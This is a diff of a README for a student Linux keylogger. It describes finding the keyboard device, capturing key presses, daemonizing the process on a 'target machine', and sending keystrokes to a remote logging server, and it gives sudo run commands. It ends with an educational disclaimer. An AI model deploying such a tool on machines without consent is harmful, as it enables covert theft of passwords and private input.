@@ -1,23 +1,20 @@
-<H2> Table of contents </H2>
-<ul>
-    <li><a href="#-compiling-">Compiling</a></li>
-    <li><a href="#Running">Running</a></li>
-    <li><a href="#Finding">Looking for keyboard device</a></li>
-    <li><a href="#Reading">Reading keyboard events</a></li>
-    <li><a href="#Termination">Termination</a></li>
-    <li><a href="#Daemonize">Daemonizing process</a></li>
-    <li><a href="#Single">Single instance daemon and file locking</a></li>
-    <li><a href="#Server">Server</a></li>
-  <li><a href="#References">References</a></li>
-  <li><a href="#Disclaimer">Disclaimer</a></li>
-</ul>
+## Table of Contents
+- [Compiling](#compiling)
+- [Running](#running)
+- [Looking for Keyboard Device](#looking-for-keyboard-device)
+- [Reading Keyboard Events](#reading-keyboard-events)
+- [Termination](#termination)
+- [Daemonizing Process](#daemonizing-process)
+- [Single Instance Daemon and File Locking](#single-instance-daemon-and-file-locking)
+- [Server](#server)
+- [References](#references)
+- [Disclaimer](#disclaimer)
 
-<H3 id="Compiling"> Compiling </H3>
-
+### Compiling
 ```c
 make
 ```
-<H3 id="Running"> Running </H3>
+### Running
 
 Synopsis:
  <code><b>./keylogger</b> <b>host</b> <b>port</b></code>
@@ -28,7 +25,7 @@ Synopsis:
 Running example (on target machine): <code>sudo ./keylogger &lt;server-ip&gt; 12345</code><br>
 Running example (on host machine): <code>./server</code>
 
-<H3 id="Finding"> Looking for keyboard device </H3>
+### Looking for keyboard device
 
 On Unix-based systems, devices are typically found in the `/dev/input/` directory. The function `int keyboardFound(char *path, int *keyboard_fd)` located in [keylogger.c](/keylogger.c) is responsible for iterating over all files of `/dev/input/` and its subdirectories to locate the keyboard device. To minimize false positives, the function performs three checks on each device:
 
@@ -68,7 +65,7 @@ As an example, let's illustrate the function's usage using a file descriptor for
 
 3. Finally, we perform the bitwise AND operation between `evbit` and `evbit_to_check`, resulting in `evbit & evbit_to_check = 00000..100000000110 & 0000...000000000110 = 0000...000000000110 = evbit_to_check`. This indicates that the device supports key events and relative movement since both `EV_KEY` and `EV_REL` bits are set in the `evbit` bitmask.
 
-<H3 id="Reading"> Reading keyboard events </H3>
+### Reading Keyboard Events
 
 To retrieve events from a device, you need to use the standard character device "read" function. Each time you read from an event device, you will receive a set of events. Each event is represented by a `struct input_event`. If you want to learn more about the fields in the input_event structure, you can refer to the documentation at https://www.kernel.org/doc/Documentation/input/event-codes.txt.
 ```c
@@ -96,21 +93,25 @@ The other three events generated are almost the same as the first three, and the
 
 *In my program, only key press events will be captured, specifically events whose type = EV_KEY and value = 1.*
 
-<H3 id="Termination">Termination</H4>
-Keylogger process can terminate gracefully by receiving two signals:
-<ul>
+### Termination
+
+Keylogger process can terminate gracefully by receiving two signals:<ul>
     <li>SIGTERM</li>
     <li>SIGPIPE (Shutting down Server)</li>
 </ul>
-<H3 id="Daemonize">Daemonizing process</H4>
+
+### Daemonizing Process
+
 The keylogger will operate in the background without direct user control. To achieve this, I have implemented the program as a daemon process. The process is converted into a daemon using the int daemonize() function. I have included comments in the code that explain each step necessary for daemonizing a process.
 
-<H3 id="Single">Single instance daemon and file locking</H4>
+### Single instance daemon and file locking 
+
 The keylogger is designed to run as a single instance at any given time. To ensure this, the daemon creates a file named "keylogger-daemon.pid" and places a write lock on the entire file, also writing its own process ID (PID) into it. This mechanism prevents other processes from acquiring a write lock on the same file, resulting in failure, as another instance of the daemon already owns the lock. In other words, only one instance of the keylogger daemon can be running simultaneously.
 The following function checks whether another instance of the daemon is already running. If not, it returns the locked file.
 
  
-<H3 id="Server"> Server </H3>
+### Server
+
 It is a simple non-blocking single-threaded server which logs keypress events, to its standard output.
 <H4 id="IO"> IO/Multiplexing with poll() </H4>
 Read operations could potentially block indefinitely, especially when the client is not pressing any keys for an extended period. This behavior would cause our main thread to block, preventing it from accepting new clients and servicing other tasks. To address this issue, we take two key measures:
@@ -121,14 +122,15 @@ Read operations could potentially block indefinitely, especially when the client
 
 When using the `poll` system call, once we have read all available data from the sockets, subsequent read attempts will not block but instead fail, and the `errno` will be set to `EWOULDBLOCK` or `EAGAIN`, indicating that there is no data to read. This enables the main thread to regain control and continue servicing other tasks and accepting new clients as needed. In this way, we ensure that the keylogger remains responsive even during idle periods on the client side.
 
-<H4 id="Logging"> Logging events session example </H4>
+### Logging
+
 Events are printed in this format : <b>"IP: &ltIP&gt - Time: &ltTIME_SEC&gt - Key: &ltKEY&gt"</b>.Let us look at an example of server receiving events from two clients:
 
 ![Immagine 2022-07-04 143610](https://user-images.githubusercontent.com/75443422/177177850-e8e5b965-5d3d-4c6c-8947-77abfc1cf9d7.png)
 
-<H2 id="References"> References </H2>
-<ul>
-<li>About system calls, signals, daemon processes and other C programming stuff: https://www.amazon.com/Advanced-Programming-UNIX-Environment-3rd/dp/0321637739</li>
+### References
+
+<ul><li>About system calls, signals, daemon processes and other C programming stuff: https://www.amazon.com/Advanced-Programming-UNIX-Environment-3rd/dp/0321637739</li>
 <li>About Linux input subsystem:
   <ul>
     <li>https://www.linuxjournal.com/article/6429</li>
@@ -138,6 +140,7 @@ Events are printed in this format : <b>"IP: &ltIP&gt - Time: &ltTIME_SEC&gt - Ke
   </ul>
   <li>About poll system call: https://www.ibm.com/docs/en/i/7.2?topic=designs-using-poll-instead-select</li>
 </ul>
-<H2 id="Disclaimer"> Disclaimer </H2>
-I have developed this program just to learn about the linux input subsystem and to put in practice notions I have acquired during the operating systems class. You shall not run this program on machines where you don't have permissions to log key presses!
 
+### Disclaimer
+
+I have developed this program just to learn about the linux input subsystem and to put in practice notions I have acquired during the operating systems class. You shall not run this program on machines where you don't have permissions to log key presses!
